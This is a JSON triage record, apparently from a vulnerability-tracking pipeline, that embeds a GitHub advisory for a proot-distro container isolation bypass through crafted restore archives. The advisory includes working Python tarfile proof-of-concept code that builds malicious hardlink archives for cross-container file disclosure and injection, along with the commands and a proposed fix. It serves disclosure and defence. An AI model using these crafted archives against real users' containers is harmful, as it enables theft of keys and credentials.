@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/99962731?v=4\", \"events_url\": \"https://api.github.com/users/x0root/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/x0root/followers\", \"following_url\": \"https://api.github.com/users/x0root/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/x0root/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/x0root\", \"id\": 99962731, \"login\": \"x0root\", \"node_id\": \"U_kgDOBfVPaw\", \"organizations_url\": \"https://api.github.com/users/x0root/orgs\", \"received_events_url\": \"https://api.github.com/users/x0root/received_events\", \"repos_url\": \"https://api.github.com/users/x0root/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/x0root/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/x0root/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/x0root\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54727\", \"cvss\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-668\", \"name\": \"Exposure of Resource to Wrong Sphere\"}], \"description\": \"## Affected Component\\n\\n- **Package:** proot-distro\\n- **Affected command:** `restore`\\n- **Attack surface:** Host-side Termux CLI processing a user-supplied backup archive\\n- **Vulnerability type:** Container Isolation Bypass / Cross-Container Read and Write\\n\\n---\\n\\n## Affected Versions\\n\\n| Component | Version |\\n|---|---|\\n| proot-distro | 5.1.5 (confirmed affected) |\\n| Test distro | Alpine Linux |\\n| Architecture | aarch64 |\\n| Device | Samsung Galaxy A23 |\\n| Package source | https://packages-cf.termux.dev/apt/termux-main stable/main aarch64 |\\n\\n---\\n\\n## Summary\\n\\nWhen restoring a crafted backup archive, `proot-distro restore` accepts hardlink entries whose source path references a different installed container.\\n\\nThe restore logic resolves the hardlink source from the archive's `linkname` field and copies the referenced file into the container identified by the archive entry.\\n\\nAlthough path traversal protections correctly keep the source path inside the proot-distro containers directory, no validation ensures that the hardlink source container matches the destination container.\\n\\nAs a result, a malicious backup archive can copy files between otherwise isolated containers, enabling both cross-container disclosure and cross-container file injection.\\n\\n---\\n\\n## Proof of Concept #1 — Cross-Container File Disclosure\\n\\nAll testing was performed using self-owned containers and harmless marker data only.\\n\\n### Step 1 — Create a victim container and marker file\\n\\n```bash\\nproot-distro install alpine --name victim\\n\\nproot-distro login victim -- sh -lc '\\nmkdir -p /root\\nprintf \\\"PROOF-12345\\\\n\\\" > /root/proof.txt\\n'\\n```\\n\\nVerification:\\n\\n```\\nproot-distro login victim -- cat /root/proof.txt\\n\\nPROOF-12345\\n```\\n\\n---\\n\\n### Step 2 — Create an attacker container\\n\\n```bash\\nproot-distro install alpine --name attacker\\n```\\n\\n---\\n\\n### Step 3 — Build a crafted archive\\n\\n```python\\npython3 -c '\\nimport tarfile\\n\\ntf = tarfile.open(\\\"malicious.tar\\\", \\\"w\\\")\\n\\nd = tarfile.TarInfo(\\\"attacker/rootfs/exfil\\\")\\nd.type = tarfile.DIRTYPE\\nd.mode = 0o755\\ntf.addfile(d)\\n\\nh = tarfile.TarInfo(\\\"attacker/rootfs/exfil/stolen_key\\\")\\nh.type = tarfile.LNKTYPE\\nh.linkname = \\\"victim/rootfs/root/proof.txt\\\"\\nh.mode = 0o600\\ntf.addfile(h)\\n\\ntf.close()\\n'\\n```\\n\\n---\\n\\n### Step 4 — Restore the crafted archive\\n\\n```bash\\nproot-distro restore ./malicious.tar\\n```\\n\\n---\\n\\n### Step 5 — Read the copied file from the attacker container\\n\\n```bash\\nproot-distro run attacker -- cat /exfil/stolen_key\\n```\\n\\nObserved output:\\n\\n```\\nPROOF-12345\\n```\\n\\nThis demonstrates that data originating from the victim container was copied into the attacker container solely through a crafted restore archive.\\n\\n---\\n\\n## Proof of Concept #2 — Cross-Container File Injection\\n\\n### Step 1 — Create attacker-controlled source data\\n\\n```bash\\nproot-distro install alpine --name attacker\\n\\nproot-distro login attacker -- sh -lc '\\nmkdir -p /root\\nprintf \\\"ATTACKER_DATA\\\\n\\\" > /root/source.txt\\n'\\n```\\n\\n---\\n\\n### Step 2 — Create a victim container\\n\\n```bash\\nproot-distro install alpine --name victim\\n```\\n\\n---\\n\\n### Step 3 — Build a crafted archive\\n\\n```python\\npython3 -c '\\nimport tarfile\\n\\ntf = tarfile.open(\\\"write_test.tar\\\", \\\"w\\\")\\n\\nh = tarfile.TarInfo(\\n    \\\"victim/rootfs/root/copied_from_attacker.txt\\\"\\n)\\n\\nh.type = tarfile.LNKTYPE\\nh.linkname = \\\"attacker/rootfs/root/source.txt\\\"\\nh.mode = 0o600\\n\\ntf.addfile(h)\\ntf.close()\\n'\\n```\\n\\n---\\n\\n### Step 4 — Restore the crafted archive\\n\\n```bash\\nproot-distro restore ./write_test.tar\\n```\\n\\n---\\n\\n### Step 5 — Verify file injection into the victim container\\n\\n```bash\\ncat \\\"$PREFIX/var/lib/proot-distro/containers/victim/rootfs/root/copied_from_attacker.txt\\\"\\n```\\n\\nObserved output:\\n\\n```\\nATTACKER_DATA\\n```\\n\\nThis demonstrates that attacker-controlled data can be copied into a different installed container solely through a crafted restore archive.\\n\\n---\\n\\n## Impact\\n\\nAn attacker who can convince a user to restore a crafted backup archive can bypass the expected isolation boundary between installed proot-distro containers.\\n\\nObserved impacts include:\\n\\n- Disclosure of files from other installed containers.\\n- Injection of attacker-controlled files into other installed containers.\\n- Exposure of SSH private keys.\\n- Exposure of API credentials.\\n- Exposure of configuration files containing secrets.\\n- Exposure of application databases stored inside container rootfs directories.\\n\\nThe issue does not escape the proot-distro containers directory but allows archive-controlled movement of data across otherwise isolated containers.\\n\\n---\\n\\n## Root Cause\\n\\nDuring hardlink processing, the restore implementation resolves the source container from the archive's `linkname` field.\\n\\nThe resolved path is validated to remain inside a container directory, but the implementation does not verify that the hardlink source container is the same container currently being restored.\\n\\nAs a result, archive-controlled metadata determines which installed container is used as the source of the copy operation.\\n\\n---\\n\\n## Proposed Fix\\n\\n```python\\nlink_container, link_src = _dest_path(member.linkname)\\n\\nif link_src is None:\\n    continue\\n\\nif link_container != container_name:\\n    continue\\n\\nlink_src = _safe_dest(\\n    link_container,\\n    link_src,\\n    follow_final=True\\n)\\n```\\n\\nThis preserves existing path traversal protections while restoring the expected isolation boundary between containers.\\n\\n---\\n\\n## Additional Notes\\n\\n- Issue reproduced on the official Termux package repository.\\n- No root access was used.\\n- No third-party data was accessed.\\n- Testing used only self-owned containers and harmless marker data.\\n- Cross-container disclosure reproduced using the marker value `PROOF-12345`.\\n- Cross-container file injection reproduced using the marker value `ATTACKER_DATA`.\", \"ghsa_id\": \"GHSA-7h3g-4w2f-fj2f\", \"github_reviewed_at\": \"2026-07-29T16:42:11Z\", \"html_url\": \"https://github.com/advisories/GHSA-7h3g-4w2f-fj2f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7h3g-4w2f-fj2f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54727\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-29T16:42:11Z\", \"references\": [\"https://github.com/termux/proot-distro/security/advisories/GHSA-7h3g-4w2f-fj2f\", \"https://github.com/termux/proot-distro/commit/98aff324b7d8500ff75a8ca9ac087ee636be4716\", \"https://github.com/termux/proot-distro/releases/tag/v5.1.6\", \"https://github.com/advisories/GHSA-7h3g-4w2f-fj2f\"], \"repository_advisory_url\": \"https://api.github.com/repos/termux/proot-distro/security-advisories/GHSA-7h3g-4w2f-fj2f\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/termux/proot-distro\", \"summary\": \"proot-distro has a Container Isolation Bypass via Crafted Restore Archive\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-29T16:42:14Z\", \"url\": \"https://api.github.com/advisories/GHSA-7h3g-4w2f-fj2f\", \"vulnerabilities\": [{\"first_patched_version\": \"5.1.6\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"proot-distro\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 5.1.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7h3g-4w2f-fj2f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "proot-distro: <= 5.1.5"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54727"
+    ],
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "proot-distro"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-29T19:35:56.271452Z",
+  "provenance": {
+    "content_sha256": "f61458061a4b686254358c1d5502c820102662bfe921500e837967de1aa6debb",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-29T16:42:11Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7h3g-4w2f-fj2f",
+  "status": "active",
+  "title": "proot-distro has a Container Isolation Bypass via Crafted Restore Archive",
+  "updated_at": "2026-07-29T16:42:14Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7h3g-4w2f-fj2f"
+}
